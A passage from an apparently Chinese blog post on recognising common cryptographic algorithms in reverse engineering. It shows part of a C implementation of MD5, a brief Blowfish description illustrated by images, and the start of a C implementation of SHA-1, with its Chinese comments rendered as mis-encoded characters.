class="hljs-number">4</span>], S24, <span class="hljs-number">0xe7d3fbc8</span>); <span class="hljs-comment">/* 24 */</span><br>    GG (a, b, c, d, x[ <span class="hljs-number">9</span>], S21, <span class="hljs-number">0x21e1cde6</span>); <span class="hljs-comment">/* 25 */</span><br>    GG (d, a, b, c, x[<span class="hljs-number">14</span>], S22, <span class="hljs-number">0xc33707d6</span>); <span class="hljs-comment">/* 26 */</span><br>    GG (c, d, a, b, x[ <span class="hljs-number">3</span>], S23, <span class="hljs-number">0xf4d50d87</span>); <span class="hljs-comment">/* 27 */</span><br>    GG (b, c, d, a, x[ <span class="hljs-number">8</span>], S24, <span class="hljs-number">0x455a14ed</span>); <span class="hljs-comment">/* 28 */</span><br>    GG (a, b, c, d, x[<span class="hljs-number">13</span>], S21, <span class="hljs-number">0xa9e3e905</span>); <span class="hljs-comment">/* 29 */</span><br>    GG (d, a, b, c, x[ <span class="hljs-number">2</span>], S22, <span class="hljs-number">0xfcefa3f8</span>); <span class="hljs-comment">/* 30 */</span><br>    GG (c, d, a, b, x[ <span class="hljs-number">7</span>], S23, <span class="hljs-number">0x676f02d9</span>); <span class="hljs-comment">/* 31 */</span><br>    GG (b, c, d, a, x[<span class="hljs-number">12</span>], S24, <span class="hljs-number">0x8d2a4c8a</span>); <span class="hljs-comment">/* 32 */</span><br>    <span class="hljs-comment">//ç¬¬3è½®å¾ªç¯å˜æ¢</span><br>    HH (a, b, c, d, x[ <span class="hljs-number">5</span>], S31, <span class="hljs-number">0xfffa3942</span>); <span class="hljs-comment">/* 33 */</span><br>    HH (d, a, b, c, x[ <span class="hljs-number">8</span>], S32, <span class="hljs-number">0x8771f681</span>); <span class="hljs-comment">/* 34 */</span><br>    HH (c, d, a, b, x[<span class="hljs-number">11</span>], S33, <span class="hljs-number">0x6d9d6122</span>); <span class="hljs-comment">/* 35 */</span><br>    HH (b, c, d, a, x[<span class="hljs-number">14</span>], S34, <span class="hljs-number">0xfde5380c</span>); <span class="hljs-comment">/* 36 */</span><br>    HH (a, b, c, d, x[ <span class="hljs-number">1</span>], S31, <span class="hljs-number">0xa4beea44</span>); <span class="hljs-comment">/* 37 */</span><br>    HH (d, a, b, c, x[ <span class="hljs-number">4</span>], S32, <span class="hljs-number">0x4bdecfa9</span>); <span class="hljs-comment">/* 38 */</span><br>    HH (c, d, a, b, x[ <span class="hljs-number">7</span>], S33, <span class="hljs-number">0xf6bb4b60</span>); <span class="hljs-comment">/* 39 */</span><br>    HH (b, c, d, a, x[<span class="hljs-number">10</span>], S34, <span class="hljs-number">0xbebfbc70</span>); <span class="hljs-comment">/* 40 */</span><br>    HH (a, b, c, d, x[<span class="hljs-number">13</span>], S31, <span class="hljs-number">0x289b7ec6</span>); <span class="hljs-comment">/* 41 */</span><br>    HH (d, a, b, c, x[ <span class="hljs-number">0</span>], S32, <span class="hljs-number">0xeaa127fa</span>); <span class="hljs-comment">/* 42 */</span><br>    HH (c, d, a, b, x[ <span class="hljs-number">3</span>], S33, <span class="hljs-number">0xd4ef3085</span>); <span class="hljs-comment">/* 43 */</span><br>    HH (b, c, d, a, x[ <span class="hljs-number">6</span>], S34,  <span class="hljs-number">0x4881d05</span>); <span class="hljs-comment">/* 44 */</span><br>    HH (a, b, c, d, x[ <span class="hljs-number">9</span>], S31, <span class="hljs-number">0xd9d4d039</span>); <span class="hljs-comment">/* 45 */</span><br>    HH (d, a, b, c, x[<span class="hljs-number">12</span>], S32, <span class="hljs-number">0xe6db99e5</span>); <span class="hljs-comment">/* 46 */</span><br>    HH (c, d, a, b, x[<span class="hljs-number">15</span>], S33, <span class="hljs-number">0x1fa27cf8</span>); <span class="hljs-comment">/* 47 */</span><br>    HH (b, c, d, a, x[ <span class="hljs-number">2</span>], S34, <span class="hljs-number">0xc4ac5665</span>); <span class="hljs-comment">/* 48 */</span><br>    <span class="hljs-comment">//ç¬¬4è½®å¾ªç¯å˜æ¢</span><br>    II (a, b, c, d, x[ <span class="hljs-number">0</span>], S41, <span class="hljs-number">0xf4292244</span>); <span class="hljs-comment">/* 49 */</span><br>    II (d, a, b, c, x[ <span class="hljs-number">7</span>], S42, <span class="hljs-number">0x432aff97</span>); <span class="hljs-comment">/* 50 */</span><br>    II (c, d, a, b, x[<span class="hljs-number">14</span>], S43, <span class="hljs-number">0xab9423a7</span>); <span class="hljs-comment">/* 51 */</span><br>    II (b, c, d, a, x[ <span class="hljs-number">5</span>], S44, <span class="hljs-number">0xfc93a039</span>); <span class="hljs-comment">/* 52 */</span><br>    II (a, b, c, d, x[<span class="hljs-number">12</span>], S41, <span class="hljs-number">0x655b59c3</span>); <span class="hljs-comment">/* 53 */</span><br>    II (d, a, b, c, x[ <span class="hljs-number">3</span>], S42, <span class="hljs-number">0x8f0ccc92</span>); <span class="hljs-comment">/* 54 */</span><br>    II (c, d, a, b, x[<span class="hljs-number">10</span>], S43, <span class="hljs-number">0xffeff47d</span>); <span class="hljs-comment">/* 55 */</span><br>    II (b, c, d, a, x[ <span class="hljs-number">1</span>], S44, <span class="hljs-number">0x85845dd1</span>); <span class="hljs-comment">/* 56 */</span><br>    II (a, b, c, d, x[ <span class="hljs-number">8</span>], S41, <span class="hljs-number">0x6fa87e4f</span>); <span class="hljs-comment">/* 57 */</span><br>    II (d, a, b, c, x[<span class="hljs-number">15</span>], S42, <span class="hljs-number">0xfe2ce6e0</span>); <span class="hljs-comment">/* 58 */</span><br>    II (c, d, a, b, x[ <span class="hljs-number">6</span>], S43, <span class="hljs-number">0xa3014314</span>); <span class="hljs-comment">/* 59 */</span><br>    II (b, c, d, a, x[<span class="hljs-number">13</span>], S44, <span class="hljs-number">0x4e0811a1</span>); <span class="hljs-comment">/* 60 */</span><br>    II (a, b, c, d, x[ <span class="hljs-number">4</span>], S41, <span class="hljs-number">0xf7537e82</span>); <span class="hljs-comment">/* 61 */</span><br>    II (d, a, b, c, x[<span class="hljs-number">11</span>], S42, <span class="hljs-number">0xbd3af235</span>); <span class="hljs-comment">/* 62 */</span><br>    II (c, d, a, b, x[ <span class="hljs-number">2</span>], S43, <span class="hljs-number">0x2ad7d2bb</span>); <span class="hljs-comment">/* 63 */</span><br>    II (b, c, d, a, x[ <span class="hljs-number">9</span>], S44, <span class="hljs-number">0xeb86d391</span>); <span class="hljs-comment">/* 64 */</span><br><br>    state[<span class="hljs-number">0</span>] += a;<br>    state[<span class="hljs-number">1</span>] += b;<br>    state[<span class="hljs-number">2</span>] += c;<br>    state[<span class="hljs-number">3</span>] += d;<br>&#125;<br><br><span class="hljs-comment">//å°†æ— ç¬¦å·æ•´æ•°è½¬ä¸ºå­—èŠ‚ç±»å‹æ•°ç»„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Encode</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *output, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, j;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; j &lt; len; i++, j += <span class="hljs-number">4</span>) &#123;<br>        output[j] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)(input[i] &amp; <span class="hljs-number">0xff</span>);<br>        output[j+<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((input[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>);<br>        output[j+<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((input[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>);<br>        output[j+<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((input[i] &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//å°†å­—èŠ‚ç±»å‹æ•°ç»„è½¬ä¸ºæ— ç¬¦å·æ•´æ•°</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Decode</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *output, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, j;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; j &lt; len; i++, j += <span class="hljs-number">4</span>)<br>        output[i] = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j]) | (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j+<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) |<br>        (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j+<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j+<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    MD5_CTX md5_calc;<br>    <span class="hljs-type">char</span> c[]=<span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> md5[<span class="hljs-number">16</span>];<br>    <span class="hljs-comment">//æ¼”ç¤ºè®¡ç®—å­—ç¬¦ä¸²abcçš„MD5ç </span><br>    MD5Init(&amp;md5_calc);<br>    MD5Update(&amp;md5_calc,(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)c,<span class="hljs-built_in">strlen</span>(c));<br>    MD5Final(md5,&amp;md5_calc);<br>    <span class="hljs-comment">//è¾“å‡ºMD5ç </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å­—ç¬¦ä¸²abcçš„MD5ç ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x&quot;</span>,md5[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="BlowFish"><a href="#BlowFish" class="headerlink" title="BlowFish"></a><strong>BlowFish</strong></h1><p>æ˜¯å¯¹ç§°åŠ å¯†ï¼Œæ˜¯ç”¨æ¥æ›¿ä»£DESç®—æ³•å‡ºç°çš„ï¼Œæ˜¯ å°†ä¸€ä¸ªæ•° æ‹†åˆ†ä¸º å·¦å³å„32ä½ç„¶å å·¦è¾¹è¿›è¡Œ ^ key_pbox å½“ä½œä¸‹ä¸€æ¬¡å¾ªç¯çš„å³è¾¹ã€‚å³è¾¹ åˆ™æ˜¯ å³è¾¹ ^ F(å·¦è¾¹)ä¸‹æ¬¡å½“ä½œå¾ªç¯çš„å·¦è¾¹</p><p>å¸¸é‡</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1703390912245-342578b0-719a-48dd-ab02-f0418c5681f1.png" class="" title="img"><p>å¸¸è§çš„å‰å‡ ä½PBox</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562401045-5cda2e71-7c6a-4a65-b23c-cc5109d80cc9.png" class="" title="img"><h2 id="å¯†é’¥æ‰©å±•"><a href="#å¯†é’¥æ‰©å±•" class="headerlink" title="å¯†é’¥æ‰©å±•"></a>å¯†é’¥æ‰©å±•</h2><p><strong>å¾ªç¯è½®æ•°å…ˆæ˜¯18ï¼Œåæ˜¯256</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562611018-1bd9f689-6e46-495d-8073-b22fa1ec241c.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562932304-1d1a2e44-0130-42e3-91f5-d3955ad66aaa.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562785506-05ec6741-6080-4994-b558-4e94c3ff83a7.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562801014-54976159-044a-4f28-9e8d-97e10aad8bf9.png" class="" title="img"><h2 id="æ•°æ®åŠ å¯†"><a href="#æ•°æ®åŠ å¯†" class="headerlink" title="æ•°æ®åŠ å¯†"></a>æ•°æ®åŠ å¯†</h2><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700563149721-eaae8489-5f37-4634-8fab-96d0ac2e4308.png" class="" title="img"><p>16è½®å¾ªç¯ï¼Œé‡Œé¢æœ‰äº¤æ¢æ“ä½œ</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700563125986-2126e3dd-4636-4c80-90ae-8e3f636ca6aa.png" class="" title="img"><h1 id="sha1"><a href="#sha1" class="headerlink" title="sha1"></a>sha1</h1><p>ä¸»å¾ªç¯4è½®ï¼Œæ¯è½®20æ¬¡æ“ä½œ </p><p>æœ‰ä¸¤ç»„å¸¸é‡ï¼Œåˆ†åˆ«å¯¹åº”kæ•°ç»„å’ŒMD buffer</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707097836461-8a93cae5-dc75-44f6-8fe6-886db0e0db5b.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1714110661316-4c4b6b35-4fe4-40d9-95b9-2f7235ce7517.jpeg" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1714110671642-2aee3dba-bad9-4b34-bad4-6475cf53cd63.jpeg" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br> <br><span class="hljs-comment">#define HASH_BLOCK_SIZE         64  /* 512 bits = 64 bytes */</span><br><span class="hljs-comment">#define HASH_LEN_SIZE           8   /* 64 bits =  8 bytes */</span><br><span class="hljs-comment">#define HASH_LEN_OFFSET         56  /* 64 bytes - 8 bytes */</span><br><span class="hljs-comment">#define HASH_DIGEST_SIZE        16  /* 128 bits = 16 bytes */</span><br><span class="hljs-comment">#define HASH_ROUND_NUM          80 </span><br> <br>typedef unsigned char       uint8_t;<br>typedef unsigned short <span class="hljs-built_in">int</span>  uint16_t;<br>typedef unsigned <span class="hljs-built_in">int</span>        uint32_t;<br>typedef unsigned long long  uint64_t;<br> <br>/* Swap <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">in</span> <span class="hljs-number">32</span> bit value. <span class="hljs-number">0x01234567</span> -&gt; <span class="hljs-number">0x67452301</span> */<br><span class="hljs-comment">#define __bswap_32(x)    \</span><br>     ((((x) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span>)  \<br>     | (((x) &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt;  <span class="hljs-number">8</span>) \<br>     | (((x) &amp; <span class="hljs-number">0x0000ff00</span>) &lt;&lt;  <span class="hljs-number">8</span>) \<br>     | (((x) &amp; <span class="hljs-number">0x000000ff</span>) &lt;&lt; <span class="hljs-number">24</span>))<br> <br>/* SHA1 Constants */<br>static uint32_t K[<span class="hljs-number">4</span>] =<br>&#123;<br>    <span class="hljs-number">0x5A827999</span>,     /* [<span class="hljs-number">0</span>,  <span class="hljs-number">19</span>] */<br>    <span class="hljs-number">0x6ED9EBA1</span>,     /* [<span class="hljs-number">20</span>, <span class="hljs-number">39</span>] */<br>    <span class="hljs-number">0x8F1BBCDC</span>,     /* [<span class="hljs-number">40</span>, <span class="hljs-number">59</span>] */<br>    <span class="hljs-number">0xCA62C1D6</span>      /* [<span class="hljs-number">60</span>, <span class="hljs-number">79</span>] */<br>&#125;;<br> <br>/*                  f(X, Y, Z)                      */<br>/* [<span class="hljs-number">0</span>,  <span class="hljs-number">19</span>] */<br>static uint32_t Ch(uint32_t X, uint32_t Y, uint32_t Z)<br>&#123;<br>    <span class="hljs-keyword">return</span> (X &amp; Y) ^ ((~X) &amp; Z);<br>&#125;<br>/* [<span class="hljs-number">20</span>, <span class="hljs-number">39</span>] */  /* [<span class="hljs-number">60</span>, <span class="hljs-number">79</span>] */<br>static uint32_t Parity(uint32_t X, uint32_t Y, uint32_t Z)<br>&#123;<br>    <span class="hljs-keyword">return</span> X ^ Y ^ Z;<br>&#125;<br>/* [<span class="hljs-number">40</span>, <span class="hljs-number">59</span>] */<br>static uint32_t Maj(uint32_t X, uint32_t Y, uint32_t Z)<br>&#123;<br>    <span class="hljs-keyword">return</span> (X &amp; Y) ^ (X &amp; Z) ^ (Y &amp; Z);<br>&#125;<br> <br>/* å¾ªç¯å‘å·¦ç§»åŠ¨offsetä¸ªæ¯”ç‰¹ä½ */<br>static uint32_t MoveLeft(uint32_t X, uint8_t offset)<br>&#123;<br>    uint32_t res = (X &lt;&lt; offset) | (X &gt;&gt; (<span class="hljs-number">32</span> - offset));<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br> <br><span class="hljs-comment">#define ASSERT_RETURN_INT(x, d) if(!(x)) &#123; return d; &#125;</span><br> <br><span class="hljs-built_in">int</span> sha1(unsigned char *out, const unsigned char* <span class="hljs-keyword">in</span>, const <span class="hljs-built_in">int</span> inlen)<br>&#123;<br>    ASSERT_RETURN_INT(out &amp;&amp; <span class="hljs-keyword">in</span> &amp;&amp; (inlen &gt;= <span class="hljs-number">0</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br> <br>    // step <span class="hljs-number">1</span>: å­—èŠ‚å¡«å……(Append Padding Bytes)<br>    // æ•°æ®å…ˆè¡¥ä¸Š<span class="hljs-number">1</span>ä¸ª<span class="hljs-number">1</span>æ¯”ç‰¹ï¼Œå†è¡¥ä¸Škä¸ª<span class="hljs-number">0</span>æ¯”ç‰¹ï¼Œä½¿å¾—è¡¥ä½åçš„æ•°æ®æ¯”ç‰¹æ•°(n+<span class="hljs-number">1</span>+k)æ»¡è¶³(n+<span class="hljs-number">1</span>+k) mod <span class="hljs-number">512</span> = <span class="hljs-number">448</span>ï¼Œkå–æœ€å°æ­£æ•´æ•°<br>    <span class="hljs-built_in">int</span> iX = inlen / HASH_BLOCK_SIZE;<br>    <span class="hljs-built_in">int</span> iY = inlen % HASH_BLOCK_SIZE;<br>    iX = (iY &lt; HASH_LEN_OFFSET) ? iX : (iX + <span class="hljs-number">1</span>);<br> <br>    <span class="hljs-built_in">int</span> iLen = (iX + <span class="hljs-number">1</span>) * HASH_BLOCK_SIZE;<br>    unsigned char* X = malloc(iLen);<br>    memcpy(X, <span class="hljs-keyword">in</span>, inlen);<br>    // å…ˆè¡¥ä¸Š<span class="hljs-number">1</span>ä¸ª<span class="hljs-number">1</span>æ¯”ç‰¹+<span class="hljs-number">7</span>ä¸ª<span class="hljs-number">0</span>æ¯”ç‰¹<br>    X[inlen] = <span class="hljs-number">0x80</span>;<br>    // å†è¡¥ä¸Š(k-<span class="hljs-number">7</span>)ä¸ª<span class="hljs-number">0</span>æ¯”ç‰¹<br>    <span class="hljs-keyword">for</span> (i = inlen + <span class="hljs-number">1</span>; i &lt; (iX * HASH_BLOCK_SIZE + HASH_LEN_OFFSET); i++)<br>    &#123;<br>        X[i] = <span class="hljs-number">0</span>;<br>    &#125;<br> <br>    // step <span class="hljs-number">2</span>: è¿½åŠ é•¿åº¦ä¿¡æ¯(Append Length)<br>    uint8_t *pLen = (uint64_t*)(X + (iX * HASH_BLOCK_SIZE + HASH_LEN_OFFSET));<br>    uint64_t iTempLen = inlen &lt;&lt; <span class="hljs-number">3</span>;<br>    uint8_t *pTempLen = &amp;iTempLen;<br>    pLen[<span class="hljs-number">0</span>] = pTempLen[<span class="hljs-number">7</span>]; pLen[<span class="hljs-number">1</span>] = pTempLen[<span class="hljs-number">6</span>]; pLen[<span class="hljs-number">2</span>] = pTempLen[<span class="hljs-number">5</span>];  pLen[<span class="hljs-number">3</span>] = pTempLen[<span class="hljs-number">4</span>];<br>    pLen[<span class="hljs-number">4</span>] = pTempLen[<span class="hljs-number">3</span>]; pLen[<span class="hljs-number">5</span>] = pTempLen[<span class="hljs-number">2</span>]; pLen[<span class="hljs-number">6</span>] = pTempLen[<span class="hljs-number">1</span>];  pLen[<span class="hljs-number">7</span>] = pTempLen[<span class="hljs-number">0</span>];<br> <br>    // Step <span class="hljs-number">3.</span> åˆå§‹åŒ–MD Buffer(Initialize MD Buffer)<br>    uint32_t H0 = <span class="hljs-number">0x67452301</span>;   // <span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x67</span><br>    uint32_t H1 = <span class="hljs-number">0xEFCDAB89</span>;   // <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEF</span><br>    uint32_t H2 = <span class="hljs-number">0x98BADCFE</span>;   // <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span><br>    uint32_t H3 = <span class="hljs-number">0x10325476</span>;   // <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x10</span><br>    uint32_t H4 = <span class="hljs-number">0xC3D2E1F0</span>;   // <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xC3</span><br> <br>    uint32_t M[HASH_BLOCK_SIZE / <span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    uint32_t W[HASH_ROUND_NUM] = &#123; <span class="hljs-number">0</span> &#125;;<br> <br>    // step <span class="hljs-number">4</span>: å¤„ç†æ¶ˆæ¯å—(Process Message <span class="hljs-keyword">in</span> <span class="hljs-number">64</span>-Byte Blocks)<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; iLen / HASH_BLOCK_SIZE; i++)<br>    &#123;<br>        /* Copy block i into X. */<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; HASH_BLOCK_SIZE; j = j + <span class="hljs-number">4</span>)<br>        &#123;<br>            uint64_t k = i * HASH_BLOCK_SIZE + j;<br>            M[j / <span class="hljs-number">4</span>] = (X[k] &lt;&lt; <span class="hljs-number">24</span>) | (X[k + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (X[k + <span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | X[k + <span class="hljs-number">3</span>];<br>        &#125;<br> <br>        /*  a. Divide M(i) into <span class="hljs-number">16</span> words W(<span class="hljs-number">0</span>), W(<span class="hljs-number">1</span>), ..., W(<span class="hljs-number">15</span>), where W(<span class="hljs-number">0</span>) <span class="hljs-keyword">is</span> the left - most word. */<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">0</span>; t &lt;= <span class="hljs-number">15</span>; t++)<br>        &#123;<br>            W[t] = M[t];<br>        &#125;<br> <br>        /*  b. For t = <span class="hljs-number">16</span> to <span class="hljs-number">79</span> let<br>        W(t) = S^<span class="hljs-number">1</span>(W(t-<span class="hljs-number">3</span>) XOR W(t-<span class="hljs-number">8</span>) XOR W(t-<span class="hljs-number">14</span>) XOR W(t-<span class="hljs-number">16</span>)). */<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">16</span>; t &lt;= <span class="hljs-number">79</span>; t++)<br>        &#123;<br>            W[t] = MoveLeft(W[t - <span class="hljs-number">3</span>] ^ W[t - <span class="hljs-number">8</span>] ^ W[t - <span class="hljs-number">14</span>] ^ W[t - <span class="hljs-number">16</span>], <span class="hljs-number">1</span>);<br>        &#125;<br> <br>        /*  c. Let A = H0, B = H1, C = H2, D = H3, E = H4. */<br>        uint32_t A = H0;<br>        uint32_t B = H1;<br>        uint32_t C = H2;<br>        uint32_t D = H3;<br>        uint32_t E = H4;<br> <br>        /*  d. For t = <span class="hljs-number">0</span> to <span class="hljs-number">79</span> do<br>        TEMP = S^<span class="hljs-number">5</span>(A) + f(t;B,C,D) + E + W(t) + K(t);<br>        E = D;  D = C;  C = S^<span class="hljs-number">30</span>(B);  B = A; A = TEMP; */<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">0</span>; t &lt;= <span class="hljs-number">19</span>; t++)<br>        &#123;<br>            uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Ch(B, C, D) + E + W[t] + K[<span class="hljs-number">0</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span 